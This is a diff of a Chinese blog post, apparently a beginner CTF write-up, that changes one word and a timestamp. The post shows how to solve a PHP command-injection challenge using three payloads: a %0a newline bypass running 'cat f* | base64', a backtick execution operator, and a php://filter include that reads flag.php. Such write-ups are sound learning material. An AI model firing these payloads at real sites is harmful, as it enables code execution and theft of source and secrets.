@@ -9,18 +9,18 @@
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="今天，写了web小分队里发的一道web基础题，它是关于php简单绕过的。  具体wp如下  首先打开网址，会看到以下内容    根据内容，可以看出是一道php换行符绕过题（%0a），我们在网址上输入以下命令  【GET】 &#x2F;?a&#x3D;system(%27%0acat%20f*%20|%20base64%27)；    成功绕过！  根据内容可以看出时base64编码，在百度上搜索base64在线解">
+  <meta name="description" content="今天，写了web小分队里发的一道web基础题，它是关于php简单绕过的。  具体wp如下  首先打开网址，会看到以下内容    根据内容，可以看出是一道php换行符绕过题（%0a），我们输入以下payload  【GET】 &#x2F;?a&#x3D;system(%27%0acat%20f*%20|%20base64%27)；    成功绕过！  根据内容可以看出时base64编码，在百度上搜索base64在线">
 <meta property="og:type" content="article">
 <meta property="og:title" content="baba童鞋的web第一天记录">
 <meta property="og:url" content="http://example.com/2020/11/23/basic-rce1/index.html">
 <meta property="og:site_name" content="baba童鞋的博客">
-<meta property="og:description" content="今天，写了web小分队里发的一道web基础题，它是关于php简单绕过的。  具体wp如下  首先打开网址，会看到以下内容    根据内容，可以看出是一道php换行符绕过题（%0a），我们在网址上输入以下命令  【GET】 &#x2F;?a&#x3D;system(%27%0acat%20f*%20|%20base64%27)；    成功绕过！  根据内容可以看出时base64编码，在百度上搜索base64在线解">
+<meta property="og:description" content="今天，写了web小分队里发的一道web基础题，它是关于php简单绕过的。  具体wp如下  首先打开网址，会看到以下内容    根据内容，可以看出是一道php换行符绕过题（%0a），我们输入以下payload  【GET】 &#x2F;?a&#x3D;system(%27%0acat%20f*%20|%20base64%27)；    成功绕过！  根据内容可以看出时base64编码，在百度上搜索base64在线">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2020/11/23/basic-rce1/web1.png">
 <meta property="og:image" content="http://example.com/2020/11/23/basic-rce1/web2.png">
 <meta property="og:image" content="http://example.com/2020/11/23/basic-rce1/web3.png">
 <meta property="article:published_time" content="2020-11-23T09:27:50.000Z">
-<meta property="article:modified_time" content="2020-11-28T08:10:44.460Z">
+<meta property="article:modified_time" content="2020-11-28T10:26:31.162Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/2020/11/23/basic-rce1/web1.png">
@@ -210,7 +210,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>  今天，写了web小分队里发的一道web基础题，它是关于php简单绕过的。<br>  具体wp如下<br>  首先打开网址，会看到以下内容<br>  <img src="/2020/11/23/basic-rce1/web1.png"><br>  根据内容，可以看出是一道php换行符绕过题（%0a），我们在网址上输入以下命令<br>  【GET】 /?a=system(%27%0acat%20f*%20|%20base64%27)；<br>  <img src="/2020/11/23/basic-rce1/web2.png"><br>  成功绕过！<br>  根据内容可以看出时base64编码，在百度上搜索base64在线解码器，进行在线解码<br>  <img src="/2020/11/23/basic-rce1/web3.png"><br>  dingdong!成功得到flag~<br>  注：<br>  exp1：php执行运算符<br>  GET /?a=echo <code>base64 flag.php</code></p>
+        <p>  今天，写了web小分队里发的一道web基础题，它是关于php简单绕过的。<br>  具体wp如下<br>  首先打开网址，会看到以下内容<br>  <img src="/2020/11/23/basic-rce1/web1.png"><br>  根据内容，可以看出是一道php换行符绕过题（%0a），我们输入以下payload<br>  【GET】 /?a=system(%27%0acat%20f*%20|%20base64%27)；<br>  <img src="/2020/11/23/basic-rce1/web2.png"><br>  成功绕过！<br>  根据内容可以看出时base64编码，在百度上搜索base64在线解码器，进行在线解码<br>  <img src="/2020/11/23/basic-rce1/web3.png"><br>  dingdong!成功得到flag~<br>  注：<br>  exp1：php执行运算符<br>  GET /?a=echo <code>base64 flag.php</code></p>
 <p>  exp2：换行符绕过（%0a）<br>  GET /?a=system(%27%0acat%20f*%20|%20base64%27);</p>
 <p>  exp3：利用include函数加php伪协议<br>  GET /a=include%20%27php://filter/convert.base64-encode/resource=./flag.php%27;<br>  （baba童鞋还是可以正经滴）</p>
 
